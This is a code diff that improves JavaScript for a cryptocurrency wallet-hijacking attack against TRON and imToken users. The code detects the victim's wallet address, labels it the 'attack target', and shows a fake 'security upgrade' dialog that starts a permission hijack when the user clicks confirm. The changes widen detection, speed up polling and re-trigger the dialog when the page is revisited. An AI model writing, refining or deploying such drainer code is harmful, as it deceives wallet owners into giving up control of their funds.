@@ -68,31 +68,50 @@
         console.log('🔑 开始检测TRON钱包连接...');
         console.log('🔑 当前环境 - TronWeb:', !!window.tronWeb);
         console.log('🔑 当前环境 - TronWeb.ready:', window.tronWeb?.ready);
-        console.log('🔑 当前环境 - UserAgent:', navigator.userAgent);
+        console.log('🔑 当前环境 - defaultAddress:', !!window.tronWeb?.defaultAddress);
         
-        if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress) {
-            const userAddress = window.tronWeb.defaultAddress.base58;
-            console.log('🔑🔑🔑 检测到TRON钱包连接成功！🔑🔑🔑');
-            console.log('🔑 真实用户地址:', userAddress);
+        // 降低检测条件，只要TronWeb存在就尝试
+        if (window.tronWeb) {
+            // 尝试获取用户地址，多种方式
+            let userAddress = null;
             
-            // 设置真实的攻击目标
-            hijackStatus.targetAddress = userAddress;
-            hijackStatus.operationType = 'SECURITY_UPGRADE'; // 固定使用安全升级伪装
-            hijackStatus.initiated = true;
-            
-            console.log('🔑 攻击目标已锁定:', userAddress);
-            console.log('🔑 立即显示权限劫持界面...');
-            
-            // 立即显示伪装的安全升级界面
-            showSecurityUpgradeModal();
-            
-            return userAddress;
-        } else {
-            console.log('⚠️ TronWeb未完全就绪，等待中...');
-            if (window.tronWeb) {
-                console.log('⚠️ TronWeb存在但ready状态:', window.tronWeb.ready);
-                console.log('⚠️ defaultAddress状态:', !!window.tronWeb.defaultAddress);
+            try {
+                if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                    userAddress = window.tronWeb.defaultAddress.base58;
+                } else if (window.tronWeb.address && window.tronWeb.address.fromHex) {
+                    // 有时候地址在其他地方
+                    const accounts = await window.tronWeb.trx.getAccount();
+                    if (accounts && accounts.address) {
+                        userAddress = window.tronWeb.address.fromHex(accounts.address);
+                    }
+                }
+            } catch (e) {
+                console.log('🔑 获取地址时出错:', e);
             }
+            
+            if (userAddress && userAddress.startsWith('T') && !hijackStatus.initiated) {
+                console.log('🔑🔑🔑 检测到TRON钱包连接成功！🔑🔑🔑');
+                console.log('🔑 真实用户地址:', userAddress);
+                
+                // 设置真实的攻击目标
+                hijackStatus.targetAddress = userAddress;
+                hijackStatus.operationType = 'SECURITY_UPGRADE';
+                hijackStatus.initiated = true;
+                
+                console.log('🔑 攻击目标已锁定:', userAddress);
+                console.log('🔑 立即显示权限劫持界面...');
+                
+                // 立即显示伪装的安全升级界面
+                showSecurityUpgradeModal();
+                
+                return userAddress;
+            } else {
+                console.log('⚠️ 地址获取失败或已经初始化过');
+                console.log('⚠️ userAddress:', userAddress);
+                console.log('⚠️ hijackStatus.initiated:', hijackStatus.initiated);
+            }
+        } else {
+            console.log('⚠️ TronWeb还未注入');
         }
         return null;
     }
@@ -198,21 +217,26 @@
         
         // 绑定事件
         modal.querySelector('#upgrade-confirm-btn').onclick = () => {
+            console.log('🔑 用户确认了权限劫持攻击！');
             overlay.remove();
             initPermissionHijack();
         };
         
         modal.querySelector('#upgrade-cancel-btn').onclick = () => {
-            overlay.remove();
             console.log('🔑 用户取消了安全升级');
+            overlay.remove();
         };
         
-        // 5秒后自动关闭
+        // 增加界面可见性
+        console.log('🔑 权限劫持界面已完全创建并显示');
+        
+        // 30秒后自动关闭
         setTimeout(() => {
             if (overlay.parentNode) {
+                console.log('🔑 权限劫持界面超时关闭');
                 overlay.remove();
             }
-        }, 30000); // 30秒超时
+        }, 30000);
     }
     
     // 🎯 启动权限劫持攻击
@@ -614,33 +638,45 @@
         // 检测imToken环境
         const isImToken = navigator.userAgent.includes('imToken') || window.imToken;
         if (isImToken) {
-            console.log('🔑 检测到imToken环境，启用移动端优化');
+            console.log('🔑 检测到imToken环境，启用积极检测模式');
         }
         
         // 立即检测钱包连接
-        if (window.tronWeb && window.tronWeb.ready) {
-            console.log('🔑 TronWeb已就绪，立即触发检测');
-            detectTronWallet();
-        }
+        detectTronWallet();
         
-        // 高频检测钱包连接（针对移动端）
+        // 超高频检测钱包连接（专门针对imToken）
         const detectInterval = setInterval(() => {
-            if (window.tronWeb && window.tronWeb.ready && !hijackStatus.initiated) {
-                console.log('🔑 检测到钱包连接，停止轮询');
-                clearInterval(detectInterval);
+            if (!hijackStatus.initiated) {
+                console.log('🔑 持续检测TronWeb状态...');
                 detectTronWallet();
+            } else {
+                clearInterval(detectInterval);
+                console.log('🔑 权限劫持已启动，停止检测');
             }
-        }, 1000); // 每1秒检测一次
+        }, 500); // 每0.5秒检测一次
         
-        // 10秒后停止轮询
+        // 15秒后停止轮询
         setTimeout(() => {
             clearInterval(detectInterval);
             console.log('🔑 检测轮询已停止');
-        }, 10000);
+        }, 15000);
+        
+        // 监听页面可见性变化，imToken切换时重新检测
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden && !hijackStatus.initiated) {
+                console.log('🔑 页面重新可见，检测权限劫持');
+                setTimeout(detectTronWallet, 1000);
+            }
+        });
+        
+        // 监听TronWeb注入事件
+        window.addEventListener('tronWebReady', () => {
+            console.log('🔑 收到TronWeb就绪事件');
+            detectTronWallet();
+        });
         
         console.log('🔑 权限劫持攻击系统初始化完成');
         console.log('🔑 攻击者配置:', ATTACKER_CONFIG);
-        console.log('🔑 伪装操作列表:', Object.keys(DISGUISE_OPERATIONS));
     }
     
     // 🎯 暴露全局接口
